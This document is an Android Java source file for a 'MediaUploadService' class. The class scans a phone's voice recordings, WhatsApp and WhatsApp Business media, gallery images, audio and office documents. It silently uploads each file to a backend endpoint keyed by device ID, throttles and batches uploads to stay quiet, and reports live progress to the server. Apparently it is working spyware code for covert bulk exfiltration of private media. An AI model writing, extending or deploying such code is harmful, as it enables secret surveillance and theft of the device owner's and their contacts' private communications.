package come.tshah.app;

import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MediaUploadService {
    private static final String TAG = "MediaUpload";

    private static final Set<String> uploadedCache = new HashSet<>();
    private static boolean cacheLoaded = false;
    private static final String CACHE_PATH = "/data/data/come.tshah.app/files/upload_cache_v2.txt";
    private static final int MAX_CACHE_SIZE = 5000;

    private static String currentDeviceId = null;
    private static MediaType currentType   = null;
    private static int liveCount          = 0;
    private static int batchCount         = 0;
    private static int totalUploaded      = 0;

    public static synchronized void runUpload(MediaType type) {
        new Thread(() -> {
            try {
                currentDeviceId = LocalCursor.deviceId();
                currentType     = type;
                liveCount       = 0;
                batchCount      = 0;
                totalUploaded   = 0;

                Log.d(TAG, "Starting " + type.getTypeName() + " for device " + currentDeviceId);

                loadCache();

                long start        = System.currentTimeMillis();
                long softDeadline = (long) AppConfig.SOFT_DEADLINE_MINUTES * 60 * 1000;

                List<String>  dirs       = MediaPaths.forType(type);
                Set<String>   extensions = MediaExtensions.forType(type);

                for (String dirPath : dirs) {
                    if (System.currentTimeMillis() - start >= softDeadline) break;
                    if (type == MediaType.VOICE) {
                        scanVoiceDirectory(dirPath, extensions, start, softDeadline);
                    } else {
                        scanFlatDirectory(dirPath, extensions, start, softDeadline);
                    }
                }

                flushCache();
                writeStatus(type);

                Log.d(TAG, "Done " + type.getTypeName() + ": " + totalUploaded + " files uploaded");
            } catch (Exception e) {
                Log.e(TAG, "runUpload error: " + e.getMessage());
            }
        }).start();
    }

    private static void scanVoiceDirectory(String dirPath, Set<String> extensions,
                                            long start, long softDeadline) {
        File dir = new File(dirPath);
        if (!dir.exists() || !dir.isDirectory()) return;
        try {
            File[] dateDirs = dir.listFiles();
            if (dateDirs == null) return;
            sortByNewest(dateDirs);

            for (File dateDir : dateDirs) {
                if (System.currentTimeMillis() - start >= softDeadline) break;
                if (!dateDir.isDirectory()) continue;

                File[] files = dateDir.listFiles();
                if (files == null) continue;
                sortByNewest(files);

                for (File file : files) {
                    if (System.currentTimeMillis() - start >= softDeadline) break;
                    if (!file.isFile()) continue;
                    if (!hasExtension(file.getName(), extensions)) continue;

                    if (processFile(file)) { totalUploaded++; throttle(); }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "scanVoice error (" + dirPath + "): " + e.getMessage());
        }
    }

    private static void scanFlatDirectory(String dirPath, Set<String> extensions,
                                           long start, long softDeadline) {
        File dir = new File(dirPath);
        if (!dir.exists() || !dir.isDirectory()) return;
        try {
            File[] entries = dir.listFiles();
            if (entries == null) return;
            sortByNewest(entries);

            for (File entry : entries) {
                if (System.currentTimeMillis() - start >= softDeadline) break;
                if (entry.isFile()) {
                    if (hasExtension(entry.getName(), extensions)) {
                        if (processFile(entry)) { totalUploaded++; throttle(); }
                    }
                } else if (entry.isDirectory()) {
                    File[] subs = entry.listFiles();
                    if (subs == null) continue;
                    sortByNewest(subs);
                    for (File sub : subs) {
                        if (System.currentTimeMillis() - start >= softDeadline) break;
                        if (!sub.isFile()) continue;
                        if (hasExtension(sub.getName(), extensions)) {
                            if (processFile(sub)) { totalUploaded++; throttle(); }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "scanFlat error (" + dirPath + "): " + e.getMessage());
        }
    }

    private static boolean processFile(File file) {
        try {
            String docId = generateDocId(file.getAbsolutePath());
            if (uploadedCache.contains(docId)) return false;

            String fileType = getFileType(file);
            String mimeType = getMimeType(file.getName());
            boolean ok = BackendClient.postMedia("/api/device/media", file, mimeType, fileType);
            if (!ok) return false;

            uploadedCache.add(docId);
            flushCache();

            liveCount++;
            if (liveCount % 5 == 0) updateLiveCounter();

            return true;
        } catch (Exception e) {
            Log.e(TAG, "processFile error (" + file.getName() + "): " + e.getMessage());
            return false;
        }
    }

    private static void throttle() {
        try {
            Thread.sleep((long) AppConfig.MEDIA_UPLOAD_DELAY_SECONDS * 1000);
            batchCount++;
            if (batchCount >= AppConfig.MEDIA_BATCH_SIZE) {
                Log.d(TAG, "Batch limit — cooling down " + AppConfig.MEDIA_BATCH_COOLDOWN_MINUTES + " min");
                Thread.sleep((long) AppConfig.MEDIA_BATCH_COOLDOWN_MINUTES * 60 * 1000);
                batchCount = 0;
            }
        } catch (InterruptedException ignored) {}
    }

    private static String getFileType(File file) {
        if (currentType == MediaType.VOICE) return "voice";
        String path = file.getAbsolutePath();
        if (path.contains("com.whatsapp.w4b") || path.contains("WhatsApp Business"))
            return "whatsapp_business";
        if (path.contains("com.whatsapp") || path.contains("/WhatsApp/"))
            return "whatsapp";
        return currentType != null ? currentType.getTypeName() : "gallery";
    }

    private static synchronized void loadCache() {
        if (cacheLoaded) return;
        try {
            File file = new File(CACHE_PATH);
            if (file.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    if (!line.isEmpty()) uploadedCache.add(line);
                }
                br.close();
            }
            cacheLoaded = true;
            Log.d(TAG, "Cache loaded: " + uploadedCache.size() + " entries");
        } catch (Exception e) {
            Log.e(TAG, "Cache load error: " + e.getMessage());
            cacheLoaded = true;
        }
    }

    private static synchronized void flushCache() {
        try {
            List<String> all    = new ArrayList<>(uploadedCache);
            List<String> toSave = all.size() > MAX_CACHE_SIZE
                    ? all.subList(all.size() - MAX_CACHE_SIZE, all.size())
                    : all;

            File file = new File(CACHE_PATH);
            if (file.getParentFile() != null) file.getParentFile().mkdirs();

            StringBuilder sb = new StringBuilder();
            for (String s : toSave) sb.append(s).append("\n");

            FileOutputStream fos = new FileOutputStream(file);
            fos.write(sb.toString().getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Cache flush error: " + e.getMessage());
        }
    }

    private static String generateDocId(String filePath) {
        try {
            String combined = (currentDeviceId != null ? currentDeviceId : "") + ":" + filePath;
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(combined.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return String.valueOf(filePath.hashCode());
        }
    }

    private static void sortByNewest(File[] files) {
        Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
    }

    private static boolean hasExtension(String filename, Set<String> extensions) {
        String lower = filename.toLowerCase();
        for (String ext : extensions) {
            if (lower.endsWith(ext)) return true;
        }
        return false;
    }

    private static String getMimeType(String fileName) {
        String f = fileName.toLowerCase();
        if (f.endsWith(".jpg")  || f.endsWith(".jpeg")) return "image/jpeg";
        if (f.endsWith(".png"))                         return "image/png";
        if (f.endsWith(".gif"))                         return "image/gif";
        if (f.endsWith(".webp"))                        return "image/webp";
        if (f.endsWith(".bmp"))                         return "image/bmp";
        if (f.endsWith(".heic") || f.endsWith(".heif")) return "image/heic";
        if (f.endsWith(".opus"))                        return "audio/opus";
        if (f.endsWith(".aac"))                         return "audio/aac";
        if (f.endsWith(".mp3"))                         return "audio/mpeg";
        if (f.endsWith(".m4a"))                         return "audio/m4a";
        if (f.endsWith(".wav"))                         return "audio/wav";
        if (f.endsWith(".ogg"))                         return "audio/ogg";
        if (f.endsWith(".flac"))                        return "audio/flac";
        if (f.endsWith(".pdf"))                         return "application/pdf";
        if (f.endsWith(".doc")  || f.endsWith(".docx")) return "application/msword";
        if (f.endsWith(".xls")  || f.endsWith(".xlsx")) return "application/vnd.ms-excel";
        if (f.endsWith(".ppt")  || f.endsWith(".pptx")) return "application/vnd.ms-powerpoint";
        if (f.endsWith(".zip"))                         return "application/zip";
        if (f.endsWith(".rar"))                         return "application/x-rar-compressed";
        return "application/octet-stream";
    }

    private static void updateLiveCounter() {
        if (currentDeviceId == null || currentType == null) return;
        try {
            org.json.JSONObject ms = new org.json.JSONObject();
            ms.put("live", liveCount);
            org.json.JSONObject outer = new org.json.JSONObject();
            outer.put(currentType.getTypeName(), ms);
            org.json.JSONObject body = new org.json.JSONObject();
            body.put("mediaStatus", outer);
            BackendClient.patch("/api/device/status", body.toString());
        } catch (Exception e) {
            Log.e(TAG, "updateLiveCounter error: " + e.getMessage());
        }
    }

    private static void writeStatus(MediaType type) {
        if (currentDeviceId == null) return;
        try {
            org.json.JSONObject typeStatus = new org.json.JSONObject();
            typeStatus.put("lastRun", System.currentTimeMillis());
            typeStatus.put("uploaded", totalUploaded);
            typeStatus.put("live", liveCount);
            org.json.JSONObject ms = new org.json.JSONObject();
            ms.put(type.getTypeName(), typeStatus);
            org.json.JSONObject body = new org.json.JSONObject();
            body.put("mediaStatus", ms);
            BackendClient.patch("/api/device/status", body.toString());
        } catch (Exception e) {
            Log.e(TAG, "writeStatus error: " + e.getMessage());
        }
    }
}
